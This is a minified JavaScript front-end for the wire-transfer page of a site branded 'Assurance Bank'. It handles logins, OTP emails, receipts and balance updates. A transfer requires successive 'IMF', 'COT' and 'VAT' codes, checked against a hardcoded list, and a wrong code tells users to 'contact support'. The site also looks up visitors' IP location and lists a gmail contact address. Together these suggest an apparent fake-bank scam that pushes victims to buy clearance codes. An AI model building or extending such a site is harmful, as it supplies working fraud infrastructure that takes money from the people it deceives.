import{s as d}from"./supabaseClient-BzAKCqO5.js";import{n as A}from"./Navbar-pMjcO_a8.js";import{s as i}from"./toast-DRvdR0y9.js";import{r as P}from"./reset-CYKpHJhn.js";import{N as S}from"./logo-nobg-UuYbhWoI.js";import"./logo-B-uS21Zh.js";const I=["E9876567","G0876578","8767898H","K2387651","456L7890","1M234567","987654N3","O2345678","98765P43","Q1987654","R7654321","567S1234","T3456789","876543U1","V1234567","345678W9","X2345678","9Y876543","Z3456781","234567A8","B3456781","123456C7","D2345678","876E5432","5678F123","6789G123","7890H234","8901I345","9012J456","0123K567","K4561237","L5672348","M6783459","N7894560","O8905671","P9016782","Q0127893","R1238904","S2349015","T3450126","U4561237","V5672348","W6783459","X7894560","Y8905671","Z9016782","A0127893","B1238904","C2349015","D3450126","E4561237","F5672348","G6783459","H7894560","I8905671","J9016782","K0127893","L1238904","M2349015","N3450126","O4561237","P5672348","Q6783459","R7894560","S8905671","T9016782","U0127893","V1238904","W2349015","X3450126","Y4561237","Z5672348","A6783459","B7894560","C8905671","D9016782","E0127893","F1238904","G2349015","H3450126","I4561237","J5672348","K6783459","L7894560","M8905671","N9016782","O0127893","P1238904","Q2349015","R3450126","S4561237","T5672348","U6783459","V7894560","W8905671","X9016782","Y0127893","Z1238904","A2349015","B3450126","C4561237","D5672348","E6783459","F7894560","G8905671","H9016782","I0127893","J1238904","K2349015","L3450126","M4561237","N5672348","O6783459","P7894560","Q8905671","R9016782","S0127893","T1238904","U2349015","V3450126","W4561237","X5672348","Y6783459","Z7894560","A8905671","B9016782","C0127893","D1238904","E2349015","F3450126","G4561237","H5672348","I6783459","J7894560","K8905671","L9016782","M0127893","N1238904","O2349015","P3450126"];function C(){return Math.floor(1e5+Math.random()*9e5).toString()}async function B(){try{return await(await fetch("https://ipapi.co/json/")).json()}catch{return{}}}function w(a={}){const e={...{title:"Wire Transfer Receipt",receiptId:h(),date:new Date().toLocaleDateString(),time:new Date().toLocaleTimeString(),amount:"0.00",currency:"$",description:"Wire Transfer",senderName:"",recipientName:"",bankName:"",accountNumber:"",transactionType:"Wire Transfer",status:"Pending",referenceNumber:"",fees:"0.00",totalAmount:"",companyName:"Assurance Bank",companyAddress:"123 Main St, City, Country",companyPhone:"+1 (555) 123-4567",companyEmail:"assurancebankcc@gmail.com",additionalFields:{},showFooter:!0,footerText:"Thank you for banking with us!"},...a};if(!e.totalAmount){const r=parseFloat(e.amount)||0,n=parseFloat(e.fees)||0;e.totalAmount=(r+n).toFixed(2)}return`
  ...
  `,document.getElementById("close-code-modal").onclick=()=>{e.innerHTML="",e.className="hidden"},document.getElementById("code-form").onsubmit=async function(r){r.preventDefault();const n=this.code.value.trim();I.includes(n)?(e.innerHTML="",e.className="hidden",l()):i("Invalid code. Please contact support.","error")}}function D(){let a=document.getElementById("success-modal");a||(a=document.createElement("div"),a.id="success-modal",document.body.appendChild(a)),a.className="",a.innerHTML=`
  ...
  `;const e=document.getElementById("success-canvas").getContext("2d");let r=0;function n(){e.clearRect(0,0,120,120),e.lineWidth=6,e.strokeStyle="#16a34a",e.beginPath(),e.arc(60,60,48,Math.PI*.5,Math.PI*(2*r),!1),e.stroke(),r<1?(r+=.03,requestAnimationFrame(n)):(e.beginPath(),e.moveTo(40,65),e.lineTo(55,80),e.lineTo(85,45),e.strokeStyle="#16a34a",e.lineWidth=8,e.stroke())}n(),document.getElementById("close-success-modal").onclick=()=>{a.innerHTML="",a.className="hidden",window.location.reload()}}const W=async()=>{P("Assurance Bank | Wire Transfer");const a=A(),l=await d.auth.getSession();if(!l.data.session){window.location.href="/login";return}const{user:e}=l.data.session,{data:r}=await d.from("profiles").select("*").eq("id",e.id).single();let{data:n}=await d.from("accounts").select("*").eq("user_id",e.id).single();const f=p=>typeof p=="number"?p.toLocaleString("en-US",{style:"currency",currency:"USD",minimumFractionDigits:2}):p||"$0.00";function k(){a.pageEvents?.(),document.getElementById("wire-transfer-form").onsubmit=async function(t){t.preventDefault();try{const s=parseFloat(this.amount.value),c=this.bankname.value.trim(),u=this.B_country.value.trim(),o=this.accountName.value.trim(),m=this.accountNum.value.trim(),g=this.swiftcode.value.trim(),x=this.desc.value.trim();if(!s||!c||!u||!o||!m||!g||!x){i("All fields are required.","error");return}if(s<=0){i("Amount must be greater than zero.","error");return}if(s>n.balance){i("Insufficient balance.","error");return}i("Sending OTP...","info");const v=C(),b=await B(),{error:N}=await d.from("otps").insert([{user_id:e.id,code:v,type:"wire",expires_at:new Date(Date.now()+10*6e4).toISOString()}]);if(N){i("Database error. Please try again.","error");return}p({amount:s,bankname:c,country:u,accountName:o,accountNum:m,swift:g,desc:x,profile:r,account:n,otp:v,ipLoc:b}),fetch("/api/send-email",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({to:e.email,subject:"Your OTP for Wire Transfer",html:`
            ...
            `})}).then($=>{$.ok?i("OTP sent to your email.","success"):i("OTP email failed, but you can still enter the code.","warning")}).catch(()=>{i("OTP email failed, but you can still enter the code.","warning")})}catch{i("An error occurred. Please try again.","error")}};function p(t){let s=document.getElementById("otp-modal");s||(s=document.createElement("div"),s.id="otp-modal",document.body.appendChild(s)),s.className="",s.innerHTML=`
      ...
      `,document.getElementById("close-otp-modal").onclick=()=>{s.innerHTML="",s.className="hidden"},document.getElementById("otp-form").onsubmit=async function(c){c.preventDefault();const u=this.otp.value.trim(),{data:o,error:m}=await d.from("otps").select("*").eq("user_id",t.profile.id).eq("code",u).eq("type","wire").order("created_at",{ascending:!1}).limit(1).single();if(m||!o||new Date(o.expires_at)<new Date){i("Invalid or expired OTP.","error");return}T(t)}}function T(t){let s=document.getElementById("otp-modal");s.className="",s.innerHTML=`
      ...
      `,document.getElementById("close-receipt-modal").onclick=()=>{s.innerHTML="",s.className="hidden"},document.getElementById("complete-wire-btn").onclick=()=>{y("IMF",()=>{y("COT",()=>{y("VAT",async()=>{D();try{const c=parseFloat(t.amount),u=parseFloat(t.account.balance),o=u-c;await d.from("accounts").update({balance:o}).eq("id",t.account.id);const{data:m,error:g}=await d.from("transactions").insert([{account_id:t.account.id,user_id:t.profile.id,type:"wire",description:t.desc,amount:c,balance_before:u,balance_after:o,status:"pending"}]).select().single();await d.from("notifications").insert([{user_id:t.profile.id,title:"Wire Transfer Initiated",message:`Your wire transfer of ${f(t.amount)} to ${t.accountName} is awaiting admin approval.`,type:"info",read:!1}]),fetch("/api/send-email",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({to:t.profile.email,subject:"Wire Transfer Receipt",html:w({amount:t.amount,senderName:t.profile.full_name,recipientName:t.accountName,bankName:t.bankname,accountNumber:t.accountNum,description:t.desc,fees:"0.00",status:"Pending",referenceNumber:m?.id||h(),companyName:"Assurance Bank",companyAddress:"123 Main St, City, Country",companyPhone:"+1 (555) 123-4567",companyEmail:"assurancebankcc@gmail.com"})})})}catch{i("Failed to process transaction. Please try again.","error")}})})})}}}return{html:`
      <div class="relative">
        ${a.html}
